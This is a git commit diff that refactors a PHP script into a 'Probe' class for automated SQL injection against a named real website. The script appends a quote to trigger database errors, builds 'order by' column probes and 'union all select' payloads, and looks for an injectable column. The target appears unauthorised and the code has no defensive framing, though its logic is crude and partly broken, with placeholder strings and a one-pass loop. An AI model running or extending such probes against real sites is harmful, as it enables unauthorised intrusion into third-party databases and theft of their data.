a489ca1e280af396966b15fc012ddf63895ce890
Anthony <ff_crazed@yahoo.com>
2016-03-03 17:08:50 +0000

    Refactor into Probe class.

--- public/index.php
+++ public/index.php
@@ -1,66 +1,92 @@
 <?php
-$url = "http://www.bible-history.com/subcat.php?id=22";
-/**
- *Returns SQL error
- *	
- */
-/*
-function getError($url)
+
+class Probe
 {
-	$headers = get_headers($url,1);
+	protected $url;
 
-	if ($headers[0] == 'HTTP/1.1 200 OK')
+	public function __construct($url)
 	{
-		$errorUrl = $url . "'";
-
-		$contents = file_get_contents($errorUrl);
-
-		return $contents;
+		$this->url = $url;
 	}
 
-	return NULL;
-}
-var_dump(getError("http://www.bible-history.com/subcat.php?id=22"));
-*/
-/*
- *Returns total number of columns
- *
- */
-/*
-$column = 1;
+	/**
+ 	 * Returns SQL error
+ 	 *	
+ 	 * @param string $url
+ 	 * @return string
+ 	 */
+	public function getError()
+	{
+		$headers = get_headers($this->url, 1);
 
-if ($column == 1)
-{
-	$orderUrl = $url . " order by " . $column;
-	$column++;
-	$contents = file_get_contents($orderUrl);
+		if ($headers[0] == 'HTTP/1.1 200 OK')
+		{
+			$errorUrl = $this->url . "'";
+
+			$contents = file_get_contents($errorUrl);
+
+			return $contents;
+		}
+
+		return NULL;
+	}
+
+	/**
+ 	 * Gets total number of columns
+ 	 *
+ 	 * @param string $url
+ 	 * @return string
+ 	 */
+	public function getColumnNum()
+	{
+		$column = 1;
+		if (true)
+		{
+			$orderUrl = $this->url . " order by " . $column;
+
+			$column++;
+
+			$contents = file_get_contents($orderUrl);
+		}	
+
+		$getRange = implode (",", range(1, $column - 1));
+
+		$shortUrl = substr_replace($this->url, "", -2);
+
+		return $shortUrl . "null union all select " . $getRange . "--";
+	}
+
+	/**
+ 	 * Returns column number that is most vulnerable to injection 
+ 	 *
+ 	 * @param  string $url
+ 	 * @return string
+ 	 */
+	public function getVulnerable()
+	{
+		$test = $this->getColumnNum();
+
+		$contents = file_get_contents($test);
+
+		$occurence = "get first occurence to inject code into to";
+
+		if (strpos($contents, $occurence))
+		{
+			return 'found';
+			//replace $occurence with selected injection into URL
+		}
+		
+		return 'not found';
+	}
 }
 
-$column--;
-$getRange = implode (",", range (1,$column));
-$shortUrl = substr_replace($url, "" ,-2);
-$getColumn = $shortUrl . "null union all select " . $getRange . "--";
-var_dump($getColumn);
-*/
-/**
- *Returns column number that is most vulnerable to injection 
- *
- */
-/*
-$test = substr_replace($url, "" ,-2);
-$test = $test . "null";
-$contents = file_get_contents($test);
-$occurence = "get first occurence to inject code into to";
+$probe = new Probe("http://www.bible-history.com/subcat.php?id=22");
 
-if (strpos($contents, $occurence) !== FALSE)
-{
-	echo 'found';
-	//replace $occurence with selected injection into URL
-}
-else
-{
+$testError = $probe->getError();
 
-	echo "not found";
-}
-*/
+$testColumn = $probe->getColumnNum();
+
+$testVulnerable = $probe->getVulnerable();
+
+var_dump($testVulnerable);
 ?>
